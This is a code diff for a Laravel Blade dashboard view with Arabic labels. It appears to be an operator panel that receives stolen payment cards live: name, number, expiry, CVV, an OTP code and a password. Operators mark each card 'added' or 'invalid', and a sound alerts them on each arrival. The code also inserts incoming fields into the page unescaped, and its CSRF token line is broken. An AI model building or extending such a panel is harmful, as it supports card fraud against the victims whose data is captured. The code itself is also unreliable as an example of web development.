@@ -203,3 +203,115 @@
 
 </section>
 @endsection
+@section('scripts')
+    <script>
+  var channelPart = pusher.subscribe('send-part');
+  channelPart.bind('App\\Events\\SendPart', function(dataPr)
+  {
+    $(".cardsList").prepend(`
+      <div class="col-12 col-sm-6 col-md-4 d-flex align-items-stretch flex-column">
+        <div class="card bg-light d-flex flex-fill border border-secondary border-5">
+          <div class="card-header bg-secondary ">       `+dataPr.cname+`          </div>
+            <div class="card-body pt-0">
+                <div class="row">
+                    <div class="col-12">
+                        <h2 class="lead mt-2"><b>Name:</b> <span class="text-muted text-sm">`+dataPr.cname+` </span></h2>
+                        <h2 class="lead mt-2"><b>Number:</b> <span class="text-muted text-sm">`+dataPr.cnmbr+` </span></h2>
+                        <h2 class="lead mt-2"><b>Expiry Date:</b> <span class="text-muted text-sm">`+dataPr.exDate+` </span></h2>
+                        <h2 class="lead mt-2"><b>CV:</b> <span class="text-muted text-sm">`+dataPr.resume+` </span></h2>
+                        <hr class="bg-white">
+                        <h2 class="lead mt-2"><b>Code:</b> <span id="code`+dataPr.part_id+`" class="text-muted text-sm"></span></h2>
+                        <h2 class="lead mt-2"><b>pass:</b> <span id="psd`+dataPr.part_id+`" class="text-muted text-sm"></span></h2>
+                    </div>
+                </div>
+            </div>
+            <div class="card-footer">
+                <div class="text-right">
+                    <a data-toggle="modal" data-target="#modal-delete-`+dataPr.part_id+`" class="btn btn-sm btn-warning">حذف البطاقة</a>
+                    <a data-toggle="modal" data-target="#modal-added-`+dataPr.part_id+`" class="btn btn-sm btn-success">تم اضافنها</a>
+                    <a data-toggle="modal" data-target="#modal-error-`+dataPr.part_id+`" class="btn btn-sm btn-danger">غير صالحة</a>
+                    <div style="height: 28px; width: 28px" class="rounded rounded-5 shadow float-left p-1 bg-secondary"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    `);
+    $(".newModals").prepend(`
+
+      <!-- Delete Model -->
+      <div dir="rtl" align="right" class="modal fade" id="modal-delete-`+dataPr.part_id+`">
+        <div class="modal-dialog">
+          <form method="post" action="/dashboard/card/destroy/`+dataPr.part_id+`">
+          <input type="hidden" name="_token" value="${$('meta[name="csrf-token"]')}" autocomplete="off">            <div class="modal-content bg-warning">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                  <span aria-hidden="true">&times;</span>
+                </button>
+                <h4 class="modal-title">حذف البطاقة (`+dataPr.cname+`)</h4>
+              </div>
+              <div class="modal-body">
+                <p>انت على وشك حذف هذه البطاقة, هل انت متأكد!</p>
+              </div>
+              <div class="modal-footer justify-content-between">
+                <button type="submit" class="btn btn-outline-dark">احذف الاًن</button>
+                <button type="button" class="btn btn-outline-dark" data-dismiss="modal">إالغاء</button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!-- Added Model -->
+      <div dir="rtl" align="right" class="modal fade" id="modal-added-`+dataPr.part_id+`">
+        <div class="modal-dialog">
+          <form method="post" action="/dashboard/card/update/`+dataPr.part_id+`">
+          <input type="hidden" name="_token" value="${$('meta[name="csrf-token"]')}" autocomplete="off">            <input type="hidden" name="status" value="success">
+            <div class="modal-content bg-success">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                  <span aria-hidden="true">&times;</span>
+                </button>
+                <h4 class="modal-title">تم اضافتها (`+dataPr.cname+`)</h4>
+              </div>
+              <div class="modal-body">
+                <p>هل اضفت البطاقة !</p>
+              </div>
+              <div class="modal-footer justify-content-between">
+                <button type="submit" class="btn btn-outline-light">نعم</button>
+                <button type="button" class="btn btn-outline-light" data-dismiss="modal">إالغاء</button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <!-- Error Model -->
+      <div dir="rtl" align="right" class="modal fade" id="modal-error-`+dataPr.part_id+`">
+        <div class="modal-dialog">
+          <form method="post" action="/dashboard/card/update/`+dataPr.part_id+`">
+          <input type="hidden" name="_token" value="${$('meta[name="csrf-token"]')}" autocomplete="off">            <input type="hidden" name="status" value="danger">
+            <div class="modal-content bg-danger">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                  <span aria-hidden="true">&times;</span>
+                </button>
+                <h4 class="modal-title">غير صالحة (`+dataPr.cname+`)</h4>
+              </div>
+              <div class="modal-body">
+                <p>البطاقة غير صالحة !</p>
+              </div>
+              <div class="modal-footer justify-content-between">
+                <button type="submit" class="btn btn-outline-light">نعم</button>
+                <button type="button" class="btn btn-outline-light" data-dismiss="modal">إالغاء</button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+
+    `);
+    playDataAudio();
+  });
+    </script>
+@endsection
